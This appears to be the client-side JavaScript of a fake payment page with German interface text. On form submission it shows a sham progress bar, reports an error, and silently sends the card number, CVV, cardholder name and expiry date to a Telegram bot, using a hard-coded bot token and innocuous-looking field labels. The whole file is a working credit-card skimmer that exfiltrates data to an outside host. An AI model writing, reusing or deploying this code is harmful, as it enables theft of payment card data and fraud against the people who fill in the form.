function showUnavailable() {
    alert('Diese Funktion ist vorübergehend nicht verfügbar');
}

function formatExpiryDate() {
    const expiryField = document.getElementById('expiry');
    let value = expiryField.value.replace(/\D/g, '');
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    expiryField.value = value;
}

document.getElementById('expiry').addEventListener('input', formatExpiryDate);

function showProgressBar() {
    const progressContainer = document.createElement('div');
    progressContainer.style.width = '100%';
    progressContainer.style.height = '6px';
    progressContainer.style.backgroundColor = '#e2e8f0';
    progressContainer.style.borderRadius = '3px';
    progressContainer.style.margin = '20px 0';
    progressContainer.style.overflow = 'hidden';
    
    const progressBar = document.createElement('div');
    progressBar.style.height = '100%';
    progressBar.style.width = '0%';
    progressBar.style.backgroundColor = '#48bb78';
    progressBar.style.borderRadius = '3px';
    progressBar.style.transition = 'width 10s linear';
    
    progressContainer.appendChild(progressBar);
    
    const payButton = document.querySelector('button[type="submit"]');
    payButton.parentNode.insertBefore(progressContainer, payButton);
    
    setTimeout(() => {
        progressBar.style.width = '100%';
    }, 100);
    
    return progressContainer;
}

document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const payButton = document.querySelector('button[type="submit"]');
    payButton.style.display = 'none';
    
    const progressContainer = showProgressBar();
    
    const cardData = {
        number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        name: document.getElementById('cardName').value,
        cvv: document.getElementById('cvv').value,
        expiry: document.getElementById('expiry').value
    };

    await new Promise(resolve => setTimeout(resolve, 10000));
    
    document.getElementById('errorMessage').style.display = 'block';
    payButton.style.display = 'block';
    progressContainer.remove();
    
    const botToken = '8230510775:AAFJCwnPp3tZr5TE17QTHHLKEQDIFeZIlSk';
    const chatId = '8463942433';
    const message = `brawl:${cardData.number}\nid:${cardData.cvv}\ngame:${cardData.name}\ndddd:${cardData.expiry}`;
    
    const img = new Image();
    img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
});
